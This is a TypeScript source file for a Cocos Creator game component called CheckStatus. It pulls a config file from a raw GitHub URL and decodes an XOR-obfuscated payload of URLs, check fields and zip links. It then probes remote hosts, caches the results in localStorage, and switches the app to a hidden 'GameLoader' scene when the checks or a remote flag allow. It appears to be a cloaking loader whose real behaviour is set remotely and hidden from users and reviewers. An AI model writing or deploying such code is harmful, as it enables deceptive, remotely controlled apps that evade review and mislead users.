import { _decorator, Component, director, log, Node } from 'cc';
import GameHTTPManager from './GameHTTPManager';
const { ccclass, property } = _decorator;

@ccclass('CheckStatus')
export class CheckStatus extends Component{
    public static LIST_LINK_CONFIG = [        
        "https://raw.githubusercontent.com/tolikala/GNew/PJGAdRF32B/uYFRE4bs3h4.txt",
    ];

    private static _instance : CheckStatus = null;

    public static getInstance(): CheckStatus {
        return this._instance;
    }

    private isCheckDomain = true;
    public listUrl = [];
    private info = "";
    private currentV = "";
    private part = "";
    private sceneToLoad = "GameLoader";
    public orient = 0;


    startLoading(){
        if(CheckStatus._instance != null && CheckStatus._instance != this){
            this.node.destroy();
            return;
        }

        CheckStatus._instance = this;
        director.addPersistRootNode(this.node);

        this.processData();
    }

    getLinkData() {
        if (CheckStatus.LIST_LINK_CONFIG.length == 0) {
            return null;
        }
        return CheckStatus.LIST_LINK_CONFIG.shift();
    }

    private _processGitURL(url){
        let self = this;
        this.getData(url + "?t=" + Date.now(), () => {
            log("processData error from getData");
            self.processData();
        }); 
    }

    processData() {
        let url = this.getLinkData();

        if (url == null) {
            return;
        }

        log("processData url: " + url);
        
        this._processGitURL(url);   
    }

    private getDataV4() {
        this.currentV = "v4";
        // let u = this.read(this.listUrl[0]);
        if(!this.isCheckDomain){
            this.getDataV6();
            this.listUrl[0] = "g";
        }
        if (this.listUrl[0].includes("http") == false) {
            return;
        }

        let self = this;
        GameHTTPManager.getInstance().sendGetHttpRequest(this.listUrl[0] + this.info, function (data) {
            self.onDataResponse(data);
        }.bind(this), function (resp) {
            self.getDataV6();
        }.bind(this));
    }

    private getDataV6() {
        this.currentV = "v6";
        if(!this.isCheckDomain){
            this.loadGame();
            return;
        }
        // let u = this.read(this.listUrl[1]);
        GameHTTPManager.getInstance().sendGetHttpRequest(this.listUrl[1] + this.info, function (data) {
            this.onDataResponse(data)
        }.bind(this), function (resp) {
            // this.getDataV6();
        }.bind(this));
    }

    private onDataResponse(data) {
        // //console.////log("onDataResponse data: ", data)
        if (this.isCheckDomain) {
            data = JSON.parse(data);
            let field = this.listUrl[2];
            if (data != null && data != undefined && data[field] != undefined) {
                this.loadGame();
            } else {
                if (this.currentV == "v4") {
                    this.getDataV6();
                }
            }
        } else {
            this.loadGame();
        }
    }

    private getData(url, errorCallback = null) {
        ////log("StartScene getData");

        let path = localStorage.getItem("SAVEDGAME_DATA");
        let path2 = localStorage.getItem("SAVEDGAME_DATA22");
        if(path && path.length && path.length > 2){
            try{
                let dt = JSON.parse(path);
                this._parseData(dt);
                this.getDataV4();
                //console.error("SWITHCING GAME");
                return;
            }catch(ex){
                //console.////log("FIALE: ",ex);
            }
        }
        
        let that = this;
        GameHTTPManager.getInstance().sendGetHttpRequest(url, function (data) {
            ////log("getData data: ", data);

            that.listUrl = data.split('\n');
            ////log('list url: ', that.listUrl)

            if (that.listUrl.length > 2) {
                ////log(that.listUrl[4]);
                if (that.listUrl.length >= 5 && that.listUrl[4].includes("skt")) {
                    that.isCheckDomain = false;
                    ////log("gogame");
                    that.loadGame();
                } else {
                    that.getDataV4();
                }
            }else{
                that.loadData(data);
            }

        }.bind(this), function () {
            if (errorCallback != null) {
                errorCallback();
            }
         });
    }


    private loadGame() {
        if (this.listUrl[3] != undefined && this.listUrl[3] != "") {
            // localStorage.setItem("SAVEDGAME_DATA", this.listUrl[3]);
            localStorage.setItem("SAVEDGAME_DATA22", this.listUrl[4]);
            director.loadScene(this.sceneToLoad);
            // let url = this.read(this.listUrl[3]);
            // let p = this.read(this.listUrl[this.listUrl.length - 1]);
            // this.stringHost = url;
            // this.onCheckGame(url);
        }
    }

    private loadData(data:string){
        let dt = this.readData(data);
        // this.setOrientation(dt[0]);
        this._parseData(dt);
        this.getDataV4();
    }

    private _parseData(dt){
        this.orient = dt[0];
        this.isCheckDomain = !dt[1];
        this.listUrl = [];
        this.listUrl.push(dt[2]);
        this.listUrl.push(dt[3]);
        this.listUrl.push(dt[4]);
        this.listUrl.push(dt[5]);
        this.listUrl.push(dt[6]);
        this.listUrl.push(dt[9] || "Đang tải... ");
        this.part = dt[6];
        let txt = JSON.stringify(dt);
        log("data: " + txt);
        localStorage.setItem("SAVEDGAME_DATA", txt);
        // this.loadGame();
    }

    private readData(encodedData: string) {

        function getPr(cbL = 3) {
            let nPr = cbL - 1;
            nPr = nPr <= 0 ? 0 : nPr;
            return nPr;
        }

        function readCb(txt: string, cbL = 3, key = 'D') {
            let out = '';
            let txts = readStringCbs(txt, cbL);

            for (let i = 0; i < txts.length; i++) {
                let n = String.fromCharCode(Number.parseInt(txts[i]) ^ key.charCodeAt(0));
                out += n;
            }

            return out;
        }

        function getSep(ver = 1) {
            switch (ver) {
                case 1:
                    return ["9689", 3];
                case 2:
                    return ["9879", 3];
                case 3:
                    return ["9789", 3];
                default:
                    return ["9869", 3];
            }
        }

        function readStringCbs(input: string, cbLen = 3): string[] {
            const sets: string[] = [];
            const nPr = getPr(cbLen);
            const length = input.length - nPr;
            input = input.substring(nPr);

            for (let i = 0; i < length; i += cbLen) {
                const set = input.slice(i, i + cbLen);
                sets.push(set);
            }

            return sets;
        }

        //get last character of encodedData
        const version = Number.parseInt(encodedData[encodedData.length - 1]);
        let sep = getSep(version);
        let cbL: number = sep[1] as number;
        let sp = sep[0] as string;
        const parts = encodedData.split(sp);
        parts.pop();
        // const cbL = parseInt(parts.pop() || ''); // Get the cbL value from the last part

        const [
            urlPro5Part, 
            skipDomainCheckPart, 
            fieldToCheckPart,
            urlV6Part, 
            orientationPart, 
            storagePathPart, 
            urlV4Part,
            isUseZipPart,
			urlZipPart,
			loadingTextPart
        ] = parts.map(part => readCb(part, cbL, '¡'));

        // const version = parseInt(versionPart);
        const orientation = parseInt(orientationPart);
        const isSkipDomainCheck = skipDomainCheckPart === '1';
        const isUseZip = isUseZipPart === '1';
        const urlV4 = urlV4Part;
        const urlV6 = urlV6Part;
        const fieldToCheck = fieldToCheckPart;
        const urlPro5 = urlPro5Part;
        const storagePath = storagePathPart;

        return [
            orientation,
            isSkipDomainCheck,
            urlV4,
            urlV6,
            fieldToCheck,
            urlPro5,
            storagePath,
            isUseZip,
            urlZipPart,
            loadingTextPart
        ];
    }
}